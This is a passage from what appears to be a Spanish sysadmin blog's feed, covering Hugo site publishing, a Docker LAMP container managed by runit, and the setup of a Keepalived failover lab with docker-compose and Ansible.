Has serta relictis, non Lucina, Phylius falsa adflata sudore. &lt;span class="o"&gt;[&lt;/span&gt;Fago inserit palpitat&lt;span class="o"&gt;](&lt;/span&gt;http://romamtot.io/hos&lt;span class="o"&gt;)&lt;/span&gt; rubentia adspicit et dolore *refert ita*, et. Quod suppressis novat sororis ubique astu&lt;span class="p"&gt;;&lt;/span&gt; pedibus spectabat dixere loquax comitem, nobis effugit&lt;span class="p"&gt;;&lt;/span&gt; tibi cibo nunc oppugnant.

Inania agat cum vidi cruribus et lanas nepotem Tethyn, umbris Agenorides stamina omnes sed fecit absumitur acclinia. Morati femina deam thyrsos vultus aequales suo deum faciem draconis diurnis liquor contentus.

Sine in robora aureus ignavis bella vaga super multa saepe atque tot **sceleratior sunt**, est furiale. Felix flammas quiete&lt;span class="p"&gt;;&lt;/span&gt; omnis vidi quoque sagittas cruentum prosunt tot vultus iamque! Auget comis me precibus vetus, hausit diversa an tulimus laniem amores *retro aequalique*. Molli arbore, altera nota&lt;span class="p"&gt;;&lt;/span&gt; furore posuisset in post Midan pollice et multos poteras.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Vemos que el servidor de desarrollo ha detectado el cambio y ha regenerado el contenido:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/site1$ hugo server
...
Change detected, rebuilding site
&lt;span class="m"&gt;2017&lt;/span&gt;-02-14 &lt;span class="m"&gt;15&lt;/span&gt;:56 +0100
Source changed /home/gerard/workspace/site1/content/post/lorem-ipsum.md
Built site &lt;span class="k"&gt;for&lt;/span&gt; language en:
&lt;span class="m"&gt;0&lt;/span&gt; draft content
&lt;span class="m"&gt;0&lt;/span&gt; future content
&lt;span class="m"&gt;0&lt;/span&gt; expired content
&lt;span class="m"&gt;1&lt;/span&gt; regular pages created
&lt;span class="m"&gt;7&lt;/span&gt; other pages created
&lt;span class="m"&gt;1&lt;/span&gt; non-page files copied
&lt;span class="m"&gt;5&lt;/span&gt; paginator pages created
&lt;span class="m"&gt;2&lt;/span&gt; tags created
&lt;span class="m"&gt;1&lt;/span&gt; categories created
total in &lt;span class="m"&gt;8&lt;/span&gt; ms
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y si apuntamos nuestro navegador a la URL sugerida &lt;a href="http://localhost:1313/"&gt;http://localhost:1313/&lt;/a&gt; podremos ver nuestro sitio web con las modificaciones pertinentes.&lt;/p&gt;
&lt;p&gt;A lo largo de la vida de la página, vamos a repetir este paso muchas veces, tal como queramos ir añadiendo más páginas.&lt;/p&gt;
&lt;h3&gt;Listos para publicar&lt;/h3&gt;
&lt;p&gt;Finalmente estamos contentos con el contenido y decidimos que está listo para ser generado como ficheros &lt;strong&gt;HTML&lt;/strong&gt; para su publicación. Esto se consigue con el uso del comando &lt;code&gt;hugo&lt;/code&gt; sin mas parámetros.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/workspace/site1$ hugo
Started building sites ...
Built site &lt;span class="k"&gt;for&lt;/span&gt; language en:
&lt;span class="m"&gt;0&lt;/span&gt; draft content
&lt;span class="m"&gt;0&lt;/span&gt; future content
&lt;span class="m"&gt;0&lt;/span&gt; expired content
&lt;span class="m"&gt;1&lt;/span&gt; regular pages created
&lt;span class="m"&gt;7&lt;/span&gt; other pages created
&lt;span class="m"&gt;0&lt;/span&gt; non-page files copied
&lt;span class="m"&gt;5&lt;/span&gt; paginator pages created
&lt;span class="m"&gt;2&lt;/span&gt; tags created
&lt;span class="m"&gt;1&lt;/span&gt; categories created
total in &lt;span class="m"&gt;27&lt;/span&gt; ms
gerard@aldebaran:~/workspace/site1$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y esto nos deja los ficheros en la carpeta &lt;code&gt;public/&lt;/code&gt; para que los publiquemos según nuestro método de despliegue favorito, sea &lt;strong&gt;FTP&lt;/strong&gt;, &lt;strong&gt;rsync&lt;/strong&gt;, o cualquier otro método. Encuentro especialmente interesante el &lt;a href="https://gohugo.io/tutorials/github-pages-blog/"&gt;uso de GitHub&lt;/a&gt; para alojar la web.&lt;/p&gt;</content><category term="html"></category><category term="generador estático"></category><category term="hugo"></category></entry><entry><title>Múltiples servicios en un mismo contenedor Docker</title><link href="http://www.linuxsysadmin.ml/2017/03/multiples-servicios-en-un-mismo-contenedor-docker.html" rel="alternate"></link><published>2017-03-06T10:00:00+01:00</published><updated>2017-03-06T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-03-06:/2017/03/multiples-servicios-en-un-mismo-contenedor-docker.html</id><summary type="html">&lt;p&gt;Como ya sabemos, un contenedor &lt;strong&gt;docker&lt;/strong&gt; solo puede ejecutar un proceso, y su finalización implica la parada del contenedor. Sin embargo, a veces nos puede interesar cargar los contenedores con algún servicio más, para hacerlos autosuficientes. Para ello, nos podemos ayudar de un &lt;em&gt;gestor de procesos&lt;/em&gt;, como por ejemplo, &lt;strong&gt;runit …&lt;/strong&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Como ya sabemos, un contenedor &lt;strong&gt;docker&lt;/strong&gt; solo puede ejecutar un proceso, y su finalización implica la parada del contenedor. Sin embargo, a veces nos puede interesar cargar los contenedores con algún servicio más, para hacerlos autosuficientes. Para ello, nos podemos ayudar de un &lt;em&gt;gestor de procesos&lt;/em&gt;, como por ejemplo, &lt;strong&gt;runit&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Antes de nada, &lt;a href="https://blog.docker.com/2014/06/why-you-dont-need-to-run-sshd-in-docker/"&gt;una referencia en contra&lt;/a&gt;; esto complica nuestro contenedor de una forma no recomendad por el propia autor de &lt;strong&gt;docker&lt;/strong&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;If you need multiple processes, you need to add one at the top-level to take care of the others. In other words, you’re turning a lean and simple container into something much more complicated.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Avisados quedáis; a partir de aquí, vamos a ver como hacerlo con un ejemplo bastante extendido: un servidor &lt;a href="https://es.wikipedia.org/wiki/LAMP"&gt;LAMP&lt;/a&gt;. La idea es que usaremos un &lt;em&gt;gestor de procesos&lt;/em&gt; llamado &lt;strong&gt;runit&lt;/strong&gt; (aunque hay otros candidatos), que me gusta por su simplicidad.&lt;/p&gt;
&lt;h2&gt;Ejemplo: El contenedor LAMP&lt;/h2&gt;
&lt;p&gt;Nuestro contenedor va a ser un servidor muy clásico, con un &lt;strong&gt;apache&lt;/strong&gt;, un &lt;strong&gt;mysql&lt;/strong&gt;, &lt;strong&gt;php5&lt;/strong&gt; y los paquetes que esta configuración requiera, como por ejemplo, el driver de la base de datos &lt;strong&gt;php5-mysql&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: No voy a añadir las instrucciones de &lt;em&gt;docker build&lt;/em&gt; ni de &lt;em&gt;docker run&lt;/em&gt; porque no aportan nada nuevo. Mejor centrémonos en las partes importantes.&lt;/p&gt;
&lt;p&gt;Vamos a utilizar la siguiente topología en la carpeta del &lt;em&gt;Dockerfile&lt;/em&gt;. La idea es que vamos a alojar el código &lt;strong&gt;php&lt;/strong&gt; en la carpeta &lt;em&gt;www&lt;/em&gt;, las configuraciones del &lt;strong&gt;apache&lt;/strong&gt; en la carpeta &lt;em&gt;apache2&lt;/em&gt; y las configuraciones de &lt;strong&gt;runit&lt;/strong&gt; en &lt;em&gt;services&lt;/em&gt;. No hay configuración específica para el &lt;strong&gt;mysql&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@antares:~/docker/lamp$ tree
.
├── apache2
│   ├── custom.conf
│   └── site.conf
├── services
│   ├── apache2
│   │   └── run
│   └── mysql
│       └── run
├── www
│   └── adminer.php
└── Dockerfile

&lt;span class="m"&gt;5&lt;/span&gt; directories, &lt;span class="m"&gt;6&lt;/span&gt; files
gerard@antares:~/docker/lamp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y como no, el &lt;em&gt;Dockerfile&lt;/em&gt; usado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@antares:~/docker/lamp$ cat Dockerfile 
FROM debian:jessie
ENV DEBIAN_FRONTEND noninteractive

&lt;span class="c1"&gt;# Paquetes necesarios&lt;/span&gt;
RUN apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    apt-get install -y runit php5 php5-mysql mysql-server &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm -rf /var/lib/apt/lists/*

&lt;span class="c1"&gt;# Configuracion de runit&lt;/span&gt;
COPY services /etc/service

&lt;span class="c1"&gt;# Configuracion de apache&lt;/span&gt;
RUN unlink /etc/apache2/sites-enabled/000-default.conf
COPY apache2/custom.conf /etc/apache2/conf-enabled

&lt;span class="c1"&gt;# Configuracion y contenido del sitio&lt;/span&gt;
COPY apache2/site.conf /etc/apache2/sites-enabled
COPY www /srv/www

CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/bin/runsvdir&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;/etc/service&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@antares:~/docker/lamp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Runit&lt;/h3&gt;
&lt;p&gt;El proceso principal, que se va a dedicar a controlar los otros procesos es &lt;strong&gt;runit&lt;/strong&gt;, concretamente mediante el binario &lt;em&gt;runsvdir&lt;/em&gt;. De acuerdo a nuestro &lt;em&gt;Dockerfile&lt;/em&gt;, va a gestionar un proceso por carpeta en &lt;em&gt;/etc/service&lt;/em&gt;. Dentro de esta carpeta va a tener información de ejecución e información de estado.&lt;/p&gt;
&lt;p&gt;Es importante poner un &lt;em&gt;script&lt;/em&gt; llamado &lt;em&gt;run&lt;/em&gt; con permisos de ejecución, que es el &lt;em&gt;script&lt;/em&gt; que &lt;strong&gt;runit&lt;/strong&gt; va a ejecutar y monitorizar, reiniciándolo en caso de caerse. No hay sorpresas en estos &lt;em&gt;scripts&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@antares:~/docker/lamp$ cat services/apache2/run 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/sbin/apache2ctl -D FOREGROUND
gerard@antares:~/docker/lamp$ cat services/mysql/run 
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;exec&lt;/span&gt; /usr/bin/mysqld_safe
gerard@antares:~/docker/lamp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Apache&lt;/h3&gt;
&lt;p&gt;El &lt;strong&gt;apache&lt;/strong&gt; necesita la configuración del &lt;em&gt;virtualhost&lt;/em&gt; que le indica lo que debe servir, y donde está; esto debe ir en &lt;em&gt;/etc/apache2/sites-enabled&lt;/em&gt;, de acuerdo con el &lt;em&gt;layout&lt;/em&gt; de directorios que utiliza la distribución usada (&lt;strong&gt;Debian&lt;/strong&gt; en este caso). Hemos eliminado el &lt;em&gt;virtualhost&lt;/em&gt; que viene por defecto.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@antares:~/docker/lamp$ cat apache2/site.conf 
&amp;lt;VirtualHost *:80&amp;gt;
    DocumentRoot /srv/www
    LogLevel info
    ErrorLog &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;APACHE_LOG_DIR&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/error.log
    CustomLog &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;APACHE_LOG_DIR&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/access.log combined
&amp;lt;/VirtualHost&amp;gt;
gerard@antares:~/docker/lamp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El otro punto conflictivo es que el fichero de configuración base no lleva permisos para servir nada en &lt;em&gt;/srv/www&lt;/em&gt;, sino en &lt;em&gt;/var/www&lt;/em&gt;. Personalmente creo que el contenido debería estar en &lt;em&gt;/srv/www&lt;/em&gt;, así que tengo que añadir estos permisos, que se puede hacer cómodamente con un fichero adicional en la carpeta &lt;em&gt;/etc/apache2/conf-enabled&lt;/em&gt;, que se incluye desde el fichero &lt;em&gt;/etc/apache2/apache2.conf&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@antares:~/docker/lamp$ cat apache2/custom.conf 
&amp;lt;Directory /srv/&amp;gt;
    Options Indexes FollowSymLinks
    AllowOverride None
    Require all granted
&amp;lt;/Directory&amp;gt;
gerard@antares:~/docker/lamp$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;MySQL&lt;/h3&gt;
&lt;p&gt;No hay nada especial para &lt;strong&gt;mysql&lt;/strong&gt;. Simplemente dejamos que la variable de entorno &lt;em&gt;DEBIAN_FRONTEND&lt;/em&gt; indique a &lt;strong&gt;apt-get&lt;/strong&gt; que no pregunte una contraseña para el usuario &lt;em&gt;root&lt;/em&gt;, quedando este usuario sin contraseña. Esto debe ser revisado con esmero.&lt;/p&gt;
&lt;h3&gt;Contenido web&lt;/h3&gt;
&lt;p&gt;Para mantener limpia la carpeta de &lt;em&gt;build&lt;/em&gt;, he decidido poner el contenido web en una carpeta &lt;em&gt;www&lt;/em&gt; aparte. Simplemente se trata del &lt;em&gt;document root&lt;/em&gt; de nuestro &lt;em&gt;virtualhost&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;En este caso se ha usado &lt;a href="https://www.adminer.org/"&gt;Adminer&lt;/a&gt; que es una aplicación prefabricada de un solo fichero para administrar nuestra base de datos. La parte interesante es que se trata de algo hecho en &lt;strong&gt;php&lt;/strong&gt; que se conecta a nuestro &lt;strong&gt;mysql&lt;/strong&gt;, y nos demuestra que todo funciona. Reemplazad el contenido de esta carpeta por vuestro código final.&lt;/p&gt;
&lt;h3&gt;Más servicios&lt;/h3&gt;
&lt;p&gt;Se necesita subir código mediante un servidor &lt;strong&gt;FTP&lt;/strong&gt; o &lt;strong&gt;SFTP&lt;/strong&gt;, algún &lt;strong&gt;cron job&lt;/strong&gt;, &lt;strong&gt;logrotate&lt;/strong&gt; o lo que sea? Pues usad la misma filosofía: instalad, configurad e instruid a &lt;strong&gt;runit&lt;/strong&gt; para que levante el proceso. Sin límites.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;RESULTADO&lt;/strong&gt;: Tras construir la imagen y ejecutarla, ya tenemos nuestro servidor funcionando en un solo contenedor.&lt;/p&gt;</content><category term="docker"></category><category term="runit"></category><category term="LAMP"></category><category term="apache"></category><category term="mysql"></category><category term="php"></category></entry><entry><title>Alta disponibilidad con Keepalived</title><link href="http://www.linuxsysadmin.ml/2017/02/alta-disponibilidad-con-keepalived.html" rel="alternate"></link><published>2017-02-27T10:00:00+01:00</published><updated>2017-02-27T10:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-02-27:/2017/02/alta-disponibilidad-con-keepalived.html</id><summary type="html">&lt;p&gt;Cuando tenemos un servicio balanceado, los &lt;em&gt;backends&lt;/em&gt; no tienen relación entre sí y podemos poner tantos como queramos, sin miedo a que alguno se caiga. Sin embargo, para los servicios tipo "ventanilla única" interesa tener varios dispuestos a dar un servicio &lt;em&gt;failover&lt;/em&gt;; si uno se cae, otro asume la carga …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Cuando tenemos un servicio balanceado, los &lt;em&gt;backends&lt;/em&gt; no tienen relación entre sí y podemos poner tantos como queramos, sin miedo a que alguno se caiga. Sin embargo, para los servicios tipo "ventanilla única" interesa tener varios dispuestos a dar un servicio &lt;em&gt;failover&lt;/em&gt;; si uno se cae, otro asume la carga.&lt;/p&gt;
&lt;p&gt;La idea general es que existe una dirección IP flotante y existe un servicio que se dedica a decidir quién la tiene asignada. Uno de estos servicios es &lt;strong&gt;keepalived&lt;/strong&gt;, que es sencillo y fácil de montar.&lt;/p&gt;
&lt;h2&gt;El entorno de trabajo&lt;/h2&gt;
&lt;p&gt;Para hacer este ejemplo, he dispuesto dos máquinas, una como prioritaria, y una de &lt;em&gt;failover&lt;/em&gt;, que va a asumir el servicio siempre que la otra no pueda hacerlo.&lt;/p&gt;
&lt;p&gt;Para mi comodidad, he dispuesto contenedores &lt;strong&gt;docker&lt;/strong&gt;, como se describe en &lt;a href="http://www.linuxsysadmin.ml/2016/06/controlando-contenedores-docker-con-ansible.html"&gt;otro artículo&lt;/a&gt; y voy a hacer la instalación por &lt;strong&gt;ansible&lt;/strong&gt;. Aunque el entorno no es muy complejo, por comodidad lo he levantado con &lt;strong&gt;docker-compose&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@gatria:~/docker/keepalived$ cat docker-compose.yml 
version: &lt;span class="s1"&gt;&amp;#39;2&amp;#39;&lt;/span&gt;
services:
  gemini:
    image: master
    hostname: gemini
    container_name: gemini
    volumes:
      - ./playbooks:/root/playbooks:ro
      - ./inventory/hosts:/root/inventory/hosts:ro
    ports:
      - &lt;span class="s2"&gt;&amp;quot;22:22&amp;quot;&lt;/span&gt;
  castor:
    image: slave
    hostname: castor
    container_name: castor
    privileged: &lt;span class="nb"&gt;true&lt;/span&gt;
  pollux:
    image: slave
    hostname: pollux
    container_name: pollux
    privileged: &lt;span class="nb"&gt;true&lt;/span&gt;
gerard@gatria:~/docker/keepalived$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La diferencia radica en que he puesto un servidor &lt;strong&gt;SSH&lt;/strong&gt; en la máquina &lt;em&gt;master&lt;/em&gt; para poder acceder fácilmente a ella y que los &lt;em&gt;playbooks&lt;/em&gt; y parte del inventario vienen de la máquina &lt;em&gt;host&lt;/em&gt;, para su fácil edición con un editor adecuado.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;AVISO&lt;/strong&gt;: Las máquinas &lt;em&gt;slave&lt;/em&gt; van a disputarse la dirección flotante; esto no es posible en un contenedor normal. Para evitar ese problema, les he puesto el &lt;em&gt;flag privilieged&lt;/em&gt;, para que puedan hacer lo que quieran.&lt;/p&gt;
&lt;p&gt;Finalmente creamos el entorno, con el comando adecuado.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@gatria:~/docker/keepalived$ docker-compose up -d
Creating network &lt;span class="s2"&gt;&amp;quot;keepalived_default&amp;quot;&lt;/span&gt; with the default driver
Creating gemini
Creating castor
Creating pollux
gerard@gatria:~/docker/keepalived$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Todos los comandos a partir de ahora se vana ejecutar en &lt;em&gt;gemini&lt;/em&gt;, que es el &lt;em&gt;master&lt;/em&gt; de &lt;strong&gt;ansible&lt;/strong&gt;, y al que vamos a acceder por &lt;strong&gt;SSH&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@gatria:~/docker/keepalived$ ssh root@localhost
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;ECDSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
root@localhost&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;s password: 

The programs included with the Debian GNU/Linux system are free software&lt;span class="p"&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class="k"&gt;for&lt;/span&gt; each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@gemini:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El fichero de &lt;em&gt;hosts&lt;/em&gt; no tiene ningún secreto (aparte de las variables dependientes de cada máquina, que ya veremos), pero lo ponemos por completitud:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~# cat inventory/hosts 
&lt;span class="o"&gt;[&lt;/span&gt;gemini&lt;span class="o"&gt;]&lt;/span&gt;
castor &lt;span class="nv"&gt;keepalived_priority&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;101&lt;/span&gt;
pollux &lt;span class="nv"&gt;keepalived_priority&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;100&lt;/span&gt;
root@gemini:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Ofreciendo un servicio cualquiera&lt;/h2&gt;
&lt;p&gt;Normalmente, las máquinas en configuración de &lt;em&gt;failover&lt;/em&gt; suelen ser balanceadores o servidores web. En realidad, esto es irrelevante para &lt;strong&gt;keepalived&lt;/strong&gt;, así que vamos a poner cualquiera.&lt;/p&gt;
&lt;p&gt;Nos hemos decantado por un servidor &lt;strong&gt;nginx&lt;/strong&gt; en configuración de servidor web estático, para que no absorba la atención del artículo. En la vida real, estaría en configuración de balanceador web, o sería directamente un &lt;strong&gt;haproxy&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Nos movemos a la carpeta de trabajo para este &lt;em&gt;playbook&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~# &lt;span class="nb"&gt;cd&lt;/span&gt; ~/playbooks/webserver/
root@gemini:~/playbooks/webserver# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El &lt;em&gt;playbook&lt;/em&gt; en sí no tiene mucho misterio; instala &lt;strong&gt;nginx&lt;/strong&gt;, lo levanta con una configuración propia y pone un fichero &lt;strong&gt;HTML&lt;/strong&gt; con una plantilla indicando el nombre de la máquina que ha servido la petición, a modo de chivato.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/webserver# cat webserver.yml 
- hosts: gemini
  gather_facts: &lt;span class="nb"&gt;false&lt;/span&gt;
  tasks:
    - apt: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx-light &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;present
    - file: &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/nginx/sites-enabled/default &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;absent
    - file: &lt;span class="nv"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/www &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;directory
    - template: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;web.j2 &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/etc/nginx/sites-enabled/web
    - template: &lt;span class="nv"&gt;src&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;index.html.j2 &lt;span class="nv"&gt;dest&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/www/index.html
    - service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;started
    - service: &lt;span class="nv"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;nginx &lt;span class="nv"&gt;state&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;reloaded
root@gemini:~/playbooks/webserver# cat web.j2 
server &lt;span class="o"&gt;{&lt;/span&gt;
    listen &lt;span class="m"&gt;80&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    server_name _&lt;span class="p"&gt;;&lt;/span&gt;
    root /www&lt;span class="p"&gt;;&lt;/span&gt;
    index index.html&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
root@gemini:~/playbooks/webserver# cat index.html.j2 
&amp;lt;p&amp;gt;Hello from &amp;lt;em&amp;gt;&lt;span class="o"&gt;{{&lt;/span&gt; inventory_hostname &lt;span class="o"&gt;}}&lt;/span&gt;&amp;lt;/em&amp;gt;&amp;lt;/p&amp;gt;
root@gemini:~/playbooks/webserver# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lo lanzamos y ya tenemos dos servidores web para nuestra demostración:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/webserver# ansible-playbook webserver.yml 

PLAY &lt;span class="o"&gt;[&lt;/span&gt;gemini&lt;span class="o"&gt;]&lt;/span&gt; ******************************************************************

TASK &lt;span class="o"&gt;[&lt;/span&gt;apt&lt;span class="o"&gt;]&lt;/span&gt; *********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;castor&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;pollux&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;file&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;castor&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;pollux&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;file&lt;span class="o"&gt;]&lt;/span&gt; ********************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;pollux&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;castor&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;template&lt;span class="o"&gt;]&lt;/span&gt; ****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;pollux&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;castor&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;template&lt;span class="o"&gt;]&lt;/span&gt; ****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;castor&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;pollux&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;service&lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;castor&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;pollux&lt;span class="o"&gt;]&lt;/span&gt;

TASK &lt;span class="o"&gt;[&lt;/span&gt;service&lt;span class="o"&gt;]&lt;/span&gt; *****************************************************************
changed: &lt;span class="o"&gt;[&lt;/span&gt;pollux&lt;span class="o"&gt;]&lt;/span&gt;
changed: &lt;span class="o"&gt;[&lt;/span&gt;castor&lt;span class="o"&gt;]&lt;/span&gt;

PLAY RECAP *********************************************************************
castor                     : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   
pollux                     : &lt;span class="nv"&gt;ok&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;changed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;7&lt;/span&gt;    &lt;span class="nv"&gt;unreachable&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;    &lt;span class="nv"&gt;failed&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;0&lt;/span&gt;   

root@gemini:~/playbooks/webserver# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Comprobamos que funciona, y con esto estamos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@gemini:~/playbooks/webserver# wget -qO- http://castor/
&amp;lt;p&amp;gt;Hello from &amp;lt;em&amp;gt;castor&amp;lt;/em&amp;gt;&amp;lt;/p&amp;gt;
root@gemini:~/playbooks/webserver# wget -qO- http://pollux/
